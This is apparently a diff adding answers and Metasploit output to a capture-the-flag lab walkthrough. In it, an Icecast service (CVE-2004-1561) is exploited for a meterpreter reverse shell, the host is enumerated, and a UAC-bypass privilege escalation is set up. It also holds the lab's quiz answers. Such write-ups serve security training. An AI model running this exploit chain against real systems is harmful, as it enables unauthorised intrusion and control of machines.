@@ -75,10 +75,15 @@ Exploit the target vulnerable service to gain a foothold!
 Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.
 
 Answer format: ******* **** ********
+
+Execute Code Overflow
+
 #2	
 What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
 
 Answer format: *************
+
+CVE-2004-1561	
 #3	
 Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`
 
@@ -87,14 +92,62 @@ No answer needed
 After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 
 
 Answer format: *******/*******/****/**************
+
+exploit/windows/http/icecast_header
+
+
 #5	
 Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.
 
 No answer needed
+
+Result: 
+
+msf5 exploit(windows/http/icecast_header) > show options
+
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.125.31     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
 #6	Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
 Answer format: ******
+
+
+RHOSTS
+
 #7	First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`
 No answer needed
+
+Ran Exploit here's output:
+
+msf5 exploit(windows/http/icecast_header) > exploit
+
+[*] Started reverse TCP handler on 10.10.125.31:4444 
+[*] Sending stage (176195 bytes) to 10.10.148.245
+[*] Meterpreter session 1 opened (10.10.125.31:4444 -> 10.10.148.245:49243) at 2020-09-30 00:37:14 +0000
+
+meterpreter > 
+
 
 [Task 4] Escalate
 
@@ -105,28 +158,90 @@ Enumerate the machine and find potential privilege escalation paths to gain Admi
 Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?
 
 Answer format: ***********
+
+meterpreter
+
+
 #2	What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room.
 Answer format: ****
+
+Run command "getuid" for this answer
+output: 
+meterpreter > getuid
+Server username: Dark-PC\Dark
+
+Dark
+
 #3	
 What build of Windows is the system?
 
 Answer format: ****
+
+Run Command "sysinfo" for this answer
+output:
+meterpreter > sysinfo
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+7601
+
 #4	
 Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?
 
 Answer format: ***
+
+Use previous Output for this answer
+
+x64
+
 #5	
 Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*
 
 No answer needed
+
+Output:
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.148.245 - Collecting local exploits for x86/windows...
+[*] 10.10.148.245 - 34 exploit checks are being tried...
+[+] 10.10.148.245 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.148.245 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.148.245 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
 #6	
 Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?
 
 Answer format: *******/*******/*****/******************
+
+exploit/windows/local/bypassuac_eventvwr
+
 #7	Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.
 No answer needed
+
+Output:
+meterpreter > 
+Background session 1? [y/N]  Y
+
 #8	Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`
 No answer needed
+
+Output:
+msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+
 #9	
 Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`
 
